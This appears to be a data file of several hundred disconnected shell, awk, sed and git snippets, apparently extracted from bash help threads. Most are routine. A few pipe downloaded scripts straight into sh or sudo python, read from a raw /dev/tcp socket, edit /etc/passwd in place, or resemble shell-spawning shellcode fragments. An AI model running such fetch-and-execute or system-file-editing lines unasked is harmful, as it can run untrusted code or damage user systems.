SCRIPTDIR=$( dirname $( which myScript.sh ) )
/Volumes/Macintosh\ HD\ 1/Users/fakeperson
/Volumes/Macintosh HD 1/Users/fakeperson
/Volumes/Macintosh\ HD\\\ 1/Users/fakeperson
/Volumes/Macintosh HD\ 1/Users/fakeperson
double quotes
export PATH=...
[difftool "kdiff3"]
[difftool "kdiff3"]
git difftool HEAD
git diff HEAD
CONFIG.c_mm2s_burst_size {$var}
line 21: 0 /var/www/processed-temp-data: division by 0 (error token is "/www/processed-temp-data")
awk -v
0 /var/www/processed-temp-data
echo $(cat)
nova start nameofinstance
xargs -t
nova start
set -xe
$(( ))
Hey guys
it's >=8.0
if it's <8.0
sw_vers -productVersion
The last awk command in the pipe
awk -v n1="$s" 'NR==n1'
echo $ARRAY_LUNS
xtract itemId
xtract 'itemId"'
"type": "Play"
grep -Eo "\"$1\": [^,]+"
sed -i
sed -i
sed -i
python <(curl https://bootstrap.pypa.io/get-pip.py)
curl https://bootstrap.pypa.io/get-pip.py | sudo python -
python -
sudo python -m ensurepip
sort -r
uniq -f 1
tail -r
less -S
sed -e 's/^/--> /
sleep 1
-v ORS=', '
{print "\047"$0"\047"}
<(grep ...)
>~/Desktop/log 2>&1
>file 2>&1
2>&1 >file
$ ./script1 /bin/bash &> output.txt &
> outfile
$( )
sed -E 's_^[/](.*)_\1_'
sed -E 's_^[/-](.*)_\1_'
man bash
NO OUTPUT
GOT INPUT >>> NO OUTPUT
echo foo | nl | rev
1 foo
oof 1
echo foo | nl | tee /dev/stderr | rev
$longest = $line
"$1" "$2"
man page
print $4
man bash
allow_fopen_url Off
set -xv
#END FILE
man sed
#END FILE
read -ra cmdArgs <<<"$@"
echo $SSH_AUTH_SOCK
sudo ssh-add ~/.ssh/id_rsa
ssd-add -l
The agent has no identities.
man sudoers
sudo env
python << END
<<END ... END
<(cat ...)
echo | python
python - <<HERE
/usr/bin/env [ -L /home1/webdevea/public_html/staging/releases/20141204173857/.htaccess ]
/usr/bin/env [ -f /home1/webdevea/public_html/staging/releases/20141204173857/.htaccess ]
head $cnt tail $cnt
head $cnt | tail -1
set [-+]e
set -e
set +e
set [-+]e
'NO RESTART'
echo "quoted argument"
echo "quoted argument"
echo $b
echo '"quoted argument"'
echo "quoted argument"
b='echo "quoted arguments"'
echo "quoted arguments"
-i ''
sed 's/.$//' filename | tee newFilename
sed '$ s/.$//' file
(echo 1a; echo 2b) | perl -e '$_=join("",<>); s/.$//; print'
(echo 1a; echo 2b) | perl -e 'while(<>){ if(eof) {s/.$//}; print }'
sed -r 's/.{2}//' -e 's/ .{2}$//'
echo -en
exec 9> /dev/ttyAMA0
export PATH=~/bin:"$PATH"
export PATH=~/bin:$PATH
$ man skill
skill -STOP --tty /dev/ttyUSB0
Could not find the main class:test. Program will exit.
package cplextest;
mysql --defaults-extra-file=~/.my.cnf
mysql --defaults-extra-file=/absolute/path/to/.my.cnf
-v OFS=","
NF>3{if (r) {r=r OFS $3} else r=$3}
/tr/ {print r; r=""}
ls -t
ls -t
**unable to spawn**
echo "$1"
good morning everybody
echo "$*"
echo "$@"
in <list>
s=$(IFS=; echo "$*")
cp find /path/to/*.war /path/to/file.war
cp /home/paul/webapps/test/target/*.war /opt/jetty/webapps/test
$name -> *.JPG
java -jar /full/path/to/file.jar
bash -c 'cd /full/path; java -jar file.jar
man sort
git branch|sed s/^..//
git log -1 --pretty=format:"%Cgreen%ci %Cblue%cr %Creset" release-3.0
diff -u <(git rev-list --first-parent release-3.0) <(git rev-list --first-parent develop)
echo -e
git log
git log
git log
make unistall
make install
source mylib
if [ "?" != 0 ]
if [ $? != 0 ]
xx yy hehe
yy hehe
while read
xx yy hehe
grep -P
for loop
printf ($i~/-..-/)?RS $i:FS $i
if ($i~/-..-/) {print RS $i) else (print FS $i)
echo ""
foo='bar'; echo "blah" echo -n $foo
enter Y or n
export INPUT="pathnametofile"
-f ""
awk -F"," -v RS="\r" '{ print $1 }' file.txt
wget -i files.txt
[[ ]]
date +%y-%m-%d
start=$(date +%s) ; remaining=1200
echo start=$(date +%s)
echo "Moving .ssh" ; ./move_ssh.sh
set -x
set +x
-v log.txt
print("/mnt/mediashare/net/192.168.1.220_STORAGE_1d1b7/" + i)
-type f
readlink -f file.txt
rpmbuild -ba test.spec
make -p $RPM_BUILD_ROOT/usr/local/bin
mkdir -p
echo "Other"
if ... else
which cp | ls -l
ls -l $(which cp)
ls -l
-i -n
prepinace_grepu="-c -v -i -f"
/Marker/ && line
find . -mindepth 1 -type d -exec bash -c 'f="$1";set $(du -bs "$f"); \ [[ $1 -lt 4294967296 ]] && echo mv "$f" /dest-dir' - '{}' \; >> output.txt
6427//6422 6429//6423 6428//6421
fileTemp=$(echo -e "$line\n" | tr "//" ","
grep -e "report +[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\"
'Your Gateway:'
man bash
stat softlink
stat -L softlink
read -u 3
tail -f /path/file.txt
tail -f
exec 3 < /path/file.txt
cd $HOME
vi .bashrc
(, *)\n
Copy Files
Run Script
Products Directory
Products Directory
sed -n -f foo.sed foo.ini
bash /home/pi/boot.sh
crontab -e
bash /home/pi/boot.sh
man 5 crontab
if [ first condition ] && [ second condition ]
stat -c %y
stat -c %z
man join
type -f
s=(!s)?$0:s RS $0
sub(/<<CODE>>/, s)
man bash
gnome-terminal --command="fzf"
gnome-terminal --command="xdotool key ctrl+t"
cat <<EOF
man bash
> output_file
> tmp && mv tmp fileB
perl -0
sed -i
sed -e
sed -i.bak
uniq -d
key user1@host1
grep -vF
r'\t' not in l
tail -n 3 input.txt | od -ax
ulimit -t 2
ps aux
8 pepper
grep -l
grep -l pepper *
grep -l pepper * | wc -l
docker ps -a
--volume $(pwd):/workdir
--env CROSS_TRIPLE=x86_64-apple-darwin
/bin/bash -s
bundle exec
bundle exec
kill -0
kill -0
2>&1 >/dev/null
>/dev/null 2>&1
kill -0
<data key='user.CC_MVFSModuleKernelPath,com.ibm.rational.clearcase.linux_x86' value='/lib/modules/2.6.32-279.el6.i686/build'/>
echo /lib/modules/
column from util-linux 2.25.2
--long database:,help,instance: -n ${APPL_NAME} --
docker creation
docker enter
cat <<...
man plist
man plutil
./ValidateDate.sh DD-MM-YYYY
grep 2>&1
$ open MyProject.xcodeproj | exec ⌘ r
source ~/.cshrc
echo "$LD_LIBRARY_PATH"
trap 'handler' DEBUG
PS1='$_ret$ '
"$? "
0 $
interface GigabitEthernet1/11
gnu awk
invalid predicate `-quit'
printf '%s\n' A B C
caller 0
i > 0
caller 0
sed -n '/^[0-9]*$/p' file
grep $address /etc/passwd
mv "$PARAM1" "$newname"
mv $PARAM1 $BACKUP
sed -i
Manipulating Strings
extern const
extern const int revision;
wc -l
sort -u FILE
sort FILE
sort FILE | uniq
vagrant up
be quiet (do not write start and done messages to standard output)
script -q /dev/null mvn dependency:tree mvn-tree.colours.txt
mvn dependency:tree
script -q /dev/null mvn dependency:tree | tee mvn-tree.colours.txt
man script
git foobar
git foobar
git: 'foobar' is not a git command. See 'git --help'.
git foob<tab>
git foobar
-bash-3.2# /usr/xpg4/bin/awk -FBirch '{print $2}' tmp.log
sudo systemctl status snmpd
audit2allow -M
sudo systemctl restart snmp
grep -vf
Nov 22 2014 @ 8:15 AM
find nas/cdn/catalog/drawings/ \( ! -regex '.*/\..*' \) -type f
ls /sys/class/net
ifup $iface
ifdown $iface
ifconfig $iface up
ifconfig $iface down
bash /script2
bash script2
find -delete
"if [[ $1 == true ]]; then echo A; else echo B; fi"
ServerName newserver
myalias -r myappid
heroku command | tail
@production heroku command
HEROKU_APP=MYPRODUCTIONID heroku command
@production myalias
perl -0
"hello\n    world"
PID, %CPU and COMMAND name
0,1,2   3,4,5   6,7,8
< <(...)
tr -s '[:blank:]' ,
sh script
xx.fast xx.sai yy.fastq yy.sai
bwa samse xx.fastq xx.sai...
bwa samse $j $j > ${j%\.*}.sam
bash example.sh
./script.sh -a $ARG_A
./script.sh -a 'test -b'
myscript.sh a.txt
0 - 29108273357520896
Dir /b
sublime text 3
OS X 10.10
read ... -d ''
shopt -s lastpipe
Unable to locate package google-chrome-stable ubuntu
deb http://dl.google.com/linux/chrome/deb/ stable main
-k 4
tr -d '/'
grep -l word *|wc -l
tr '[A-Z]' '[a-z]' | tr -d '[:punct:]'
tr 'A-Z ' 'a-z\n'
sort -u
sort | uniq -c
sort -u
sort | uniq -c
print $2
/file \"named.ca\";/,/^};/
"file "named.ca";
apt-get install nodejs
[[ ]]
[ ${x} -lt ${y} ]
date -d "next year" +%s
-type f
sleep 123
sleep 123
system("kill $p")
sleep 123
sleep 123
echo "DEVSTAGINGQAPROD" | sed "s/PROD|ING|(?<!Q)A//g"
-bash: !Q: event not found
echo "DEVSTAGINGQAPROD" | sed "s/PROD|ING//g
man ssh
tmux send-keys
source $HOME/.alias
split -a 1 -l 1 file out
man split
touch new.conf
sed -i.bak '$d' test.txt
sed = test.txt
kill $!
example=$(find /path/to/files -name "test")
ls -la /*
[ -z "${item##*/.}" -o -z "${item##*/..}" -o -z "${item##*/\*}" ] && continue
grep -o
ssh user@remotehost aaa.exe
ssh user@remotehost "cd /xxx; aaa.exe"
ssh user@remotehost vim /xxx/filename"
gnome-terminal -e $script &
mv ${param}/*.txt ${param}/archive
awk 'FNR-1' ${listoffiles} >> ${param}/${filename}
-10 and -5 is 5
-10 and 10 is 20
7 and 21 is 14
100 and -11 is 111
./script.sh -10 -5
$1 - $2
FUNCTION_NAME [ARG...]
VAR=$(COMMAND [ARG...])
function FUNCTION_NAME { FUNCTION_BODY }
$1 >= $2
$1 - $2
$2 - $1
deamon_name status
Deamon_name running / not running
Not running.
Server Running
Not Running
String =
if [ -n "$CMD" ]
cat ~/.bash_profile
ALTER SYSTEM FLUSH SHARED_POOL
ALTER SYSTEM FLUSH SHARED_POOL
TEMPORARY TABLE
exec :rc := package.function(parameter,parameter,parameter)
alter system flush shared_pool
… stdbuf -oL tee …
locate -i computation | grep -i theory
locate -i computation
grep -i theory
/root/books/History theory and practice of the electric telegraph.pdf
strings * | grep -Hn 'word'
strings *
grep word . -rHna
$jiraReleases "Version1.2.3"
.[] | {id,name} | select(.name=='\""${JIRA_FIXVERSION}"\"')
name= $line
echo 1
name /path/
for line in $(cat /path/to/my/file.txt)
C:\Program Files\nodejs
hadoop fs -ls /dabc | sed -n '/2014-12-11 09:00/ , /2014-12-12 09:00/p'
echo ${name}, hello
set -xv
[[ .. ]]
command | ...
command 2> >(... >&2; result=${PIPESTATUS[*]})
while read
grep -q
-v rc=1
/pattern/ { rc=0 }
END {exit rc}
/Documents/Untitled Folder/file.txt
while IFS= read -r
sh test.sh USB0 USB1 foo.txt
compgen -v
test -n
test -z
bash test $@ odd result
dollar at
$# = 0
[ ]
-n something
[ -n ]
[ -n "$var" ]
$# = 0
test -n "$@"
test -n
test -n
test option: return true if string is non-empty
test -n "$@" --> test -n --> test "-n" --> TRUE
for f in "$@" ; do ... done
! test -z
$# = 0
"$1" ...
$# = 0
test -n "$@"
test -n
test -n
test STRING
test -n STRING
test STRING
test -n
crontab -l
@reboot cd my_project_path; ./start.sh
@reboot cd my_project_path; ./start.sh
-bash: @reboot: command not found
lsb_release -r
| cut -d " " -f 2-
perl -ne 'chomp; if($. % 2){print "$_,";next;}
"-bash: logfileMachineB: No such file or directory
cat $logfileMachineB
echo "$a"
gvim -b --remote-tab
vim --help
vim --remote
vim --remote-tab
vim filename
gvim -b --remote-tab ...
alias vim='/usr/bin/vim'
echo 5
echo . ; sleep 1 ;echo . ; sleep 1 ; echo . ; sleep 1
env KEY=value my_script
KEY=value my_script
#!/usr/bin/env python
env key=Value my_script
man bash
hash [-lr] [-p filename] [-dt] [name]
sudo -u www-data ./bashscript
cd direc*
python execution
bc <<< "3%5"
bc -l
bc -l
bc -l
DJ aaa
for ((i=0;i<10;i++)); do echo $i; done
while ((i=0;i<10;i++)); do echo $i; done
i=0; while [ $i -lt 10 ]; do echo $i; i=$(( i + 1 )); done
bash$ while ((i=0;i<10;i++)); do echo $i; done
<div id="response"></div>
/^<\/Group/ && missing {print "FUNEnable missing for group <" name}
not found
[[ $name =~ $re ]] && echo "yes"
[[ ]]
Regular Expressions
grep -E
Bash >= 3.0
[[ " h " =~ '\bh\b' ]] && echo yes || echo no
[[ " h " =~ '\bh\b'  ]] && echo yes || echo no
right hand side
pat='\bh\b' ; [[ " h " =~ $pat  ]] && echo yes || echo no
-d ' '
-d ' '
set lmargin at screen 0; set rmargin at screen 0.5
set lmargin at screen 0.5; set rmargin at screen 1
layout 1,2
bash -c
chmod a+rx yourname
for ... in
buf = buf sep p
bash --login -x
set -x
grep -r PATTERN /
grep -r PATTERN .??*
echo foo
exec bash
[[ ,${LIBS_FROM_GIT}, =~ ,${name}, ]]
bash -c "<script>"
help wait
jobs -pr
wait -n
wait -n
wait -n
sleep 1
cut -d ' ' -f2- $string
$( )
ls *sh
pathname expansion
ln() {...;}
awk '/^M$/{n++}; END { print n+0 }' my_file
curl [url] | tee -a [file]
man df
Mounted on
s/[[:blank:]]\+/ /g
enter code here
sed -f script3 YourSoureFile
/path/run.sh &
| tac
-i ''
sed -i ''
$file = "file.log.gz"
date -d yourdate +%B
${langs[*]/#/ }
sleep 1
$ LANG=C help source
perl rename/prename
chmod +x
"%d/%m/%Y %H:%M:%S"
dmesg -T
dmesg -T
dmesg -T
man bash
FROMTASK ="Start"
sudo apt-get install libxml2-utils
yum install libxml2-utils
<curl command> | jq '.["issues"] | map({key: .key, type: .fields.issuetype.name, typeid: .fields.issuetype.id, status: .fields.status.name, summary: .fields.summary})' > FullClosedIssueList.json
bash yourscript
sh yourscript
read -a
grep 'define HZ' /usr/include/asm*/param.h
Hertz * time * n_cpus
sed -n '/foo/,/^foo/!p'
man bash
sed '/^\s*$/d' tmp|sed '0~1 a\ '
Hello World!\n
next line
Hello World!
grep -rHI $flags bar .
grep -rHI --include "*.txt" bar .
bash startup.sh
alias goto_test="cd /Library/WebServer/Documents"
source .profile
-bash: alias: /Library/WebServer/Documents: not found
cd /Library/WebServer/Documents
alias show_test="ls"
alias show_test=ls
alias goto_test=cd ~/
Local Programming
"Local Programming"
-a 1 2
-e '0'
-o '0,1.2,1.3,1.4,1.5,2.2,2.3,2.4,2.5'
S1 - S8
sed -i 's/STRING_TO_SEARCH_FOR/STRING_TO_REPLACE_SEARCH_STRING_WITH/'
d[$1]=$2" "d[$2]
print $1,d[$1]
{'k3': 'v3', 'k2': 'v2', 'k1': 'v1', 'k5': 'k4 k1 v1', 'k4': 'k1 v1'}
k1 k2
k2 k1
k1 v1
k1 x1
basename "$(dirname "$PWD")"
" "
tr -s " " "/n"
egerp -c
wc -l
git help log
link_len + 1
link_len - 1
currency pair
currecny pair
array element
echo "$MAAND"
crontab -e
heroku run console
heroku run bash
sed -i
> abc
cat abc | tee abc > /dev/null
% sed "s/root/toor/" /etc/passwd | grep -v joey | sponge /etc/passwd
| grep -v "string"
s/ .*$//
echo "${BASH_REMATCH[1]}"
gnu awk
python -u
#!/usr/bin/python -u
read host rest
perl -le 'print $?'
big_job; sms.pl +4512131415 "job is done"
wget -P $dir/$
wget -P $dir/$sub1/$ID
cmdlines = " ".join(map(lambdas x:("'"+x+"'"), jos))
stdin,stdout,stderr = ssh.exec_command(cmdlines)
bash -c
'/usr/bin/hive' '-e' ''set mapred.job.queue.name=exp_dsa; select * from trinity.clickstream where application_mobile_device_id = '59ab' and event_timestamp = '141833140000';''
'/usr/bin/hive' '-e' "set mapred.job.queue.name=exp_dsa; select * from trinity.clickstream where application_mobile_device_id = '59ab' and event_timestamp = '141833140000';"
/usr/bin/hive -e "set mapred.job.queue.name=exp_dsa; select * from trinity.clickstream where application_mobile_device_id = '59ab' and event_timestamp = '141833140000';'"
cmd_lines = "/usr/bin/hive -e \"set mapred.job.queue.name=exp_dsa; select * from trinity.clickstream where application_mobile_device_id = '59ab' and event_timestamp = '141833140000';\""
Grade 1
Grade 3
Grade 3
teacher/Grade 3
alias folder1='cd /c/folder1'
crontab -l
50 23 * * * /root/dbbackup
out1.txt out2.txt
root@server [/home]# insertintodb.sh AAA
/home/insertintodb.sh $path
' '.join
$ sed -e 's/AllowOverride None/AllowOverride All/i' file
AllowOverride None
AllowOverride All
<Directory /var/www/>
<Directory /var/www/>
/<Directory \/var\/www\/>/,/<\/Directory>/
{s~AllowOverride None~AllowOverride All~i}
#<Directory /var/www/>#, \#</Directory>#
Directory /var/www/>
<Directory /var/www/>
AllowOverride All
AllowOverride None
|& tee -a log_file.log
trap "echo Non-zero exit code detected" ERR
set -e
find -name
whereis <YOURAPPNAME/YOURLIBNAME>
source vars.sh intel64
which mkl_link_tool
e2 80 8c e2 80 8b
e2 80 8c
Unicode ⁌
e2 80 8b
Unicode ⁋
minus sign
character class shortcut
character class
wget $s/$wildcard
wc -l
shuf -n1 *.subjects
PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
$(ls dir)
bash script.bash foo
source git_extensions.sh
exit 1
grep -e '^commit [a-z0-9]{40}'
grep -e '^commit [a-z0-9]\{40\}'
/etc/init.d/nginx start
test -x $DAEMON || exit 0
total + 1
total + lines
"My long"
"My long"
[[ ]]
man bash
-mtime +365
source ~/.bash_profile
source ~/.bashrc
bash --version
brew install bash
No matches found
yum provides repoquery
echo "${message}" >> "${logfile}"
No such file or directory
ls -l /usr/local/bin/meteor
which meteor
rm -rf ~/.meteor
rm /usr/local/bin/meteor
rm 'which meteor'
curl https://install.meteor.com/ | sh
sudo chmod +rx /usr/local/bin
-bash: XYZ: command not found
-bash: /path/to/XYZ: Permission denied
sudo chmod +rx /path/to/XYZ
sudo chmod +x /path /path/to
sudo chmod
command not found
sudo su -
which meteor
which meteor
a=$(echo *)
/Users/foo/Library/Application *
echo $a
[[ ]]
download http
.bashrc $PATH
newkey: .complex["key"]
[^ ]*$
sed -r 's/^.*>(.*) .*/pathfind -t lane -id \1 -f fastq -l/
man bash
wait -n
i %10
wait -n
wait -n
shopt -s compat31
| mail -s "Server Low Memory" email@me.com
echo $line | awk -F "\"*,\"*" '{print $2}'
echo $line | cut -d, -f2
python ./App.pyc
can't open file './App.pyc' [Errno 2] No such file or directory
[Errno 1]
sed -n '/trade_id_external/s/.*=//p' ./file.xml
git branch -a
"$(< )"
openssl rsa -in key.pem -pubout -out pubkey.pem
openssl asn1parse -in pubkey.pem
02 03
00 01 00 01
01 00 01
declare -n
help declare
ssh user@host
ssh -t user@host "command goes here"
cd /my/path
bash -i
echo -e
/dev/tcp/192.168.1.2/12345 > /tmp/file
nc / ncat / nfqueue
/usr/bin/tftp -l /tmp/tst -r testfile.txt -g <server ip>
a=1 b=2 c=3 a=50
a=50 b=2 c=3
-v RS=" |\n"
END{for (k in a) printf "%s=%s ",k,a[k]}
read -d" "
ls ~\
cheatsheet = "$HOME/cheatsheet"
echo $PATH
Build Artifacts
git someCommand
date +%N
man tempfile
echo a
echo b
echo a
echo b
a echo b
tr , '\n'
awk '/65/'
$1 == 65
{ print $2}
gnu awk
echo "$i"
echo "${i#*:}"
(( ))
depth = 1
[1]+  Stopped                 a.pl
man bash
passwd &
bash --login
awk '{print ($5=="")?:$5}'
echo $dir | sed 's_\(/export/home\).*_\1_' > olddir
echo one && echo two
echo one || echo two
if [[ 1 -eq 2 ]]; then doStuff; fi
[[ 1 -eq 2 ]] && doStuff
sudo apt-get update && sudo apt-get -y upgrade && apt-get -y autoremove && startx
other_command | my_script
> /dev/null
2> /dev/null
> /dev/null
sed regex
" title
back reference
back reference
[ ]
/home/path/to/p410.yaml: Directory nonexistent
find $HOME -iname p410.yaml
vim 'find $HOME -iname p410.yaml'
this is line 2
man uniq
sort my_list.txt | uniq -u
$ exit
$ logout
$ fuser -k /dev/pts/[n]
CTRL + d
CTRL + d
0xEF 0xBF 0xBC (efbfbc)
Some ￼xlinkx
Some [link]
sed -i
sed -i.bak
source .deploymentrc
COMPREPLY=( "$scriptDir"/* )
CHAVEZ MONTAï¿½O
CHAVEZ MONTA O
CHAVEZ MONTA O
sed -i 's/[ï¿½]/\ \ /g' filename
echo 'ï' | wc -c
print $0
nc: invalid option -- 'z'
Linux elasticsearch 4.4.0-101-generic #124~14.04.1-Ubuntu SMP Fri Nov 10 19:05:36 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 
bash -c
wait-port 8080
-t ,
-a 1
-o auto
FNR==1 { ++ARGIND }
$(( ))
sudo mksh /folder/script.sh
cat -v /folder/script.sh
{"/bin/sh", NULL}
db "/bin/sh"
push    rax
pop     rdi
grep ": error:" makeErr.txt
num=$(ls /tmp/ | wc -l) num=$((num-1)) (ls -lt /tmp/ | tail -n $num;ls) | sort|uniq -u|xargs rm
x = b'\x23\xa3\xef' ...
eval echo
if [[ $line =~ "<"*">" ]]
. <( ... )
4:33 + 0:20 - 2:45 = 2:08
(mmss/60, mmss%60)
(4 * 60 + 33) + (0 * 60 + 20) - (2 * 60 + 45)
date -d "4:33 + 2:22" +%H:%M
$3 == ""
\find -X . -type d -name trunk | xargs -L 1 ack PATTERN
' '') and double (
\find . -type d -name trunk -print0 | xargs -0 -L 1 ack PATTERN
shopt -s globstar
chmod +x jq
do shell script
open <url>
open -a Safari <url>
LSOpenURLsWithRole() failed for the application /Applications/Safari.app with error -1712 for the URLs ...
open location <url>
tell application Safari to open location <url>
$( )
set -e
if f; then .... fi
if g; then ... fi
set -e
while loop
while read
IFS= while read -r name
ps | grep
ps | grep kwrite
ps | grep
ps | grep whatever
grep whatever
pgrep whatever
Enthought Canopy
Mac OSX, 10.8.5 (Mountain Lion)
open -a TextEdit .bash_profile
[[ -s "$HOME/.profile" ]] && source "$HOME/.profile" # Load the default .profile
echo $(cat file)
$ !
sep "\"%s\""
. $1
[ -f $1]
"sudo svn add *"
{sudo svn add *} &>/dev/null
sudo svn add *
<font color='#FF0000'> and </font>
dbcheck.sh username/password@database
bash-4.2$ dbcheck.sh
java Loop
sleep 5
[ "$ftemplateids" ]
git diff
grep: /tmp/dict.txt: No such file or directory
git diff --cached
git diff --name-only
git grep
git grep
java -version
-X stuff
-X stuff
sed [regex],+[#lines]!d file
grep -A [#lines] [regex] input_file
type -a rsync
rsync is aliased to `sudo rsync'
ls -l $(which rsync)
<, <<, >, >>
|tr -d '.'
-type d -links 2
-type d
-links 2
echo "potato" 2>/dev/null >&2
echo "potato" >&2
> somefile
1> somefile
n> somefile
command1 > /dev/null | comamnd2
ls -l /proc/$$/fd/
sed: can't read BX-Book-Ratings:: No such file or directory
line sed: -e expression #1, char 14: unknown option to
 echo "abc$acb" > a.txt
echo "abc\$acb" > a.txt
echo 'abc$acb' > a.txt
find -maxdepth 1 -name DirName
mget -c *
mvn --version
find ... -printf '%T@:%p\n'
sort -V
sed -r 's/^[^:]+://'
du -ms
{ ... }
ps aux
pgrep myprocess
pidof myprocess
printf 'this is an error' >&2; exit 1;
source;target (utilisez.ff.chrome; utilisez de préférence Firefox ou Chrome)
YOUR =
YOUR=$(echo "${FILE}" | sed 's/my/your/')
rsync -r / --restOfYourRsyncArgs
sh -c 'bash in here'
sh -c "SOMEVAR=$(expr 1 - 2) && echo $SOMEVAR"
$(expr 1 - 2)
SOMEVAR=-1 && echo SOMEVAR
sh -c
dpkg: error: need an action option
> utf8_encoded.txt
which find
typeset -f
typeset -f
declare -f
command find
set | grep find
myint out
sudo visudo
export set
column 2
column 3
column 4
$2 == "b2" && $3 == "c2"
from kth - nth columns
-v k="$k" -v n="$n"
k and n
nohup ruby $OPENSHIFT_REPO_DIR.openshift/cron/minutely/main.rb &
nohup ruby $OPENSHIFT_REPO_DIR.openshift/cron/minutely/main.rb &
'#!/usr/bin/env ruby'
while true
[[ -d "$directory" ]]
mkdir "$directory" && break
[[ ... ]]
file1 - file2
perl's rename
tail -f
sed '/xyzFunction/ i #ifndef COMMENT_OUT' file1.c > opt;mv opt file1.c
s/.*/#ifndef COMMENT_OUT\n&/
newname=$(basename .gplt)
$(basename "$f" .gplt)
for (i in subs)
12.2.1 Controlling Array Traversal
8.1.6 Using Predefined Array Scanning Orders
-x c
make repl
; \
echo ${var::-4}
echo ${name:0:$((${#name}-10))}
var2=$(sed 's/.\{4\}$//' <<<"$var")
echo ${array[25]}
shuf -i 1-49 -n 7 | xargs -n7
FULL FILE OUTPUT
FULL FILE
FULL FILE
FULL FILE
tail -f /var/log/messages
[VENDOR ID]
[PRODUCT ID]
SVN: E155021: this client is too old to work with the working copy
which svn
echo $?
echo $?
kill 32230: No such process
echo $?
grep java
git add -A && git commit -a
git status
git add -A
git add -A
git commit -a
git commit -a
git push
git add -A
git commit -a
git commit -a
git push
git init
cd ..
shopt -s nullglob
make -n
make -n
ssh -i $HOME/.ssh/id_boot2docker -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" docker@$host
level="fatal" msg="Post http:///var/run/docker.sock/v1.16/containers/create: dial unix /var/run/docker.sock: no such file or directory. Are you trying to connect to a TLS-enabled daemon without TLS?"
MSYS_HOME=/c/Program\ Files\ \(x86\)/Git
head -n 15
head -n -2
echo "your first new line here..."
curl -i -H 'Authorization: token $apiKey ...'
yowsup-cli -a --interactive <PHONE_NUMBER_HERE> --wait --autoack --keepalive --config yowsup-master/src/yowsup-cli.config
yowsup-cli -a --interactive <PHONE_NUMBER_HERE> --wait --autoack --keepalive --config yowsup-master/src/yowsup-cli.config > /path/to/my_file
echo "UID is $UID and EUID is $EUID"
ssh user@example.com 'ls -lai'
var args = ["user@example.com", "ls -lai"];
read var
new project-name
new name-of-laravel-5-project
\b or \< \>
arr[1] = value1
arr[2] = value2
arr['param1'] = value1
file -b --mime-encoding
iconv -f ISO-8859-1 -t UTF-8
echo -e
ls *.txt | stitch | stitch -u
cron entry
crontab -e
( )
$( )
{ echo 'out'; echo >&2 'error'; }
awk '{print "stdout: " $0}'
awk '{print "stderr: " $0}'
{ }
(( ))
[[ ... ]]
:call MappingInfo("something")
:Minfo something
E488: Trailing characters
local bar
set -a
declare -g
--max-procs= ( or -P)
echo ${!var_pointing_to_another_var}
echo ${!${var}_string_suffix}
pgrep -f
ps auxww|grep abcd
pgrep -f abcd
2 x 5 y
cal | less
13 days
%w == 0
2 weeks
%w == 1
"$(ls -Atr | grep [.]jpg)"
:set nobomb
sed -n l file
python -c
pc "pi*(2**2)"
echo "$var" | awk ...
condition { action }
#squid start;
#squid stop;
#squid restart;
sudo tee file >/dev/null
date +%Y%m%d HH:MM:SS
-O -
grep -n grep
grep -n grep
git rebase -i -p
git commit --amend --author "a.jard <a.jard@mail.com>"
git branch -f master origin/master
git author-rewrite
git branch -f master origin/master
git tag tmp devel
git branch -f devel master
git cherry-pick
git tag -d tmp
git branch -f master E2
git filter-branch
vagrant ssh --command
Connection to 127.0.0.1 closed.
curl_setopt($ch,CURLOPT_POSTFIELDS, $curl_parameters);
man ln
while read
ls -rt | while read -r file; do
sleep 10
wait $!
sleep 10
wait $!
sleep 10
-A bogon -m iprange --src-range 0.0.0.1-0.255.255.255 -j LOGNDROP
dig +short facebook.com
0 1 2
curl -H "Authorization: token FOO-TOKEN-HERE" https://api.github.com/user/repos -d '{"name":"my-new-repo-name"}'
$(secret NAME-OF-SECRET-VARIABLE)
[globbing] unmatched close brace/bracket in column 1
"/bin/bash /root/full-migrate.sh"
php -i | grep extension_dir
extension_dir => /usr/lib64/php/modules => /usr/lib64/php/modules
php -i | grep extension_dir | cut -d'>' -f3
for d in $(seq 1 $dom); do
today=$(date -d "$year-$month-$d" '+%x') # locale's date representation (e.g. 12/31/99)
dow=$(date -d "$year-$month-$d" '+%u')   # day of week: 1-7 with 1=Monday, 7=Sunday
if [ "$dow" -le 5 ]  && grep -vq "$today" /path/holidays
"$dow" -le 5 ]
grep -vq "$today" /path/holidays
then workday=Yes; nworkdays=$((nworkdays+1))
else workday=
[ "$workday" ] && [ "$nworkdays" -eq 1 ] && /path/command
grep -o "TYPE_C = \"[0-9a-zA-Z-]*\"" text.txt
substring extraction
s/-\(.\)/ \u\1/g
- followed by character
space followed by uppercase of the character
( )
echo $b($(c))
echo $b{!c}
echo $b${c}
echo ${d[$c]}
$i > $i
$i >> $i
-i inplace
awk  ... $i > tmpfile && mv tmpfile $i
SELECT nickname, email FROM db_Users;
/burrito/ {f="burrito"}
/taco/ {f="taco"}
prints the line into the file stored in
. You can also say
iostat -dx 1
>/dev/null 2>&1
bin/sh -c
>/dev/null 2>&1
system("date \\' >/dev/null 2>&1")
bash -c
Flag 1
grep -f
printf '%q'
sed '/msq_Query/,+11 {1,11n;s/1477361456/1234/}' file
& (pattern matched)
global substitution (g)
docker exec my-container-name bash
sed -n
f==1 && /Names/{print $2,$3,$4}
if f == 1 and maches pattern Name with line
{print $0,"\"Category\"";next}
split($3, a, " ")
Your sessions path is /tmp/sessions
CTRL-A x
crontab -e
crontab -l
echo "Beginning remote connections..." >> $logfile
while read; do ... done < file
for host in $(cat ...)
$( )
tail -n
/regular file/
? :
print sum+0
print +sum
echo $CLASSPATH
human readable
7985734902867 MyLongFile.txt
<directory path>
awk -F"[ <>]" '{for (i=1;i<=NF;i++) print i"="$i}' file
sed -i.bak
exit 0
exit 1
make -j
system("source ~/.bash_profile")
system("kill -SIGUSR1 #{Process.ppid}")
hash -r
command winpdb
Thu Jan 01 23:47:36 2015 Restart pause, 5 second(s)
profile start
git checkout baz
Directory 1
$LOC/Directory 1
set -xv
set +xv
-i may not be used with stdin
set -vx
echo -n disable >/sys/firmware/acpi/interrupts/gpe66
!'some text'
'some text'
var=$(command that produces output)
var=value command
1 2 3 4 5 7 9
cp demo.txt /shared
echo 'sample text' > demo.txt
while [ true ]
tail | grep
if, then, else
if, then, else
while [ true ]
[[ -f "$berkas" ]]
